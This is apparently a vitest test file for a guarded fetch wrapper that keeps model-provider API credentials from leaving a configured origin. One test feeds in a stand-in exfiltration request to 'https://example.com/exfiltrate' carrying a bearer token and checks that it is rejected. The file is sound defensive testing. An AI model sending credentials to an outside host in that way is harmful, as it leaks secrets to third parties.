import { describe, expect, it, vi } from "vitest";
import {
  createGuardedMarketplaceProviderFetch,
  createGuardedModelProviderFetch,
  isGuardedInsecureCredentialedModelProviderFetch,
} from "../marketplace-provider-fetch.js";

describe("guarded model-provider fetch", () => {
  it("rejects a public cross-origin request before it can forward credentials", async () => {
    const fetchImpl = vi.fn() as unknown as typeof fetch;
    const providerFetch = createGuardedModelProviderFetch(
      "http://10.232.178.100:30000/v1",
      fetchImpl,
    );

    await expect(
      providerFetch("https://example.com/exfiltrate", {
        headers: { Authorization: "Bearer internal-key" },
      }),
    ).rejects.toThrow("configured origin");
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it("permits credentialed HTTP only for the self-hosted guarded fetch", () => {
    const baseUrl = "http://10.232.178.100:30000/v1";
    const selfHostedFetch = createGuardedModelProviderFetch(baseUrl);
    const marketplaceFetch = createGuardedMarketplaceProviderFetch(baseUrl, {
      providerId: "private-marketplace",
      label: "Private marketplace provider",
      baseUrl,
      defaultModel: "private/model",
      modelOptions: ["private/model"],
      requiresApiKey: true,
    });

    expect(isGuardedInsecureCredentialedModelProviderFetch(baseUrl, selfHostedFetch)).toBe(true);
    expect(isGuardedInsecureCredentialedModelProviderFetch(baseUrl, marketplaceFetch)).toBe(false);
  });

  it("rejects every request and registers no trust policy when the baseUrl is unparseable", async () => {
    // `originFor("not a url")` hits the URL-constructor catch and returns null,
    // so `configuredOrigin` is null: no request can equal an absent origin, and
    // the `if (configuredOrigin)` policy-registration guard is skipped.
    const fetchImpl = vi.fn() as unknown as typeof fetch;
    const providerFetch = createGuardedModelProviderFetch("not a url", fetchImpl);

    await expect(
      providerFetch("http://10.0.0.5:8000/v1/models", {
        headers: { Authorization: "Bearer internal-key" },
      }),
    ).rejects.toThrow("configured origin");
    expect(fetchImpl).not.toHaveBeenCalled();

    // No policy was recorded for the unparseable baseUrl, so credentialed-HTTP
    // trust cannot be claimed for it.
    expect(
      isGuardedInsecureCredentialedModelProviderFetch("not a url", providerFetch),
    ).toBe(false);
  });
});
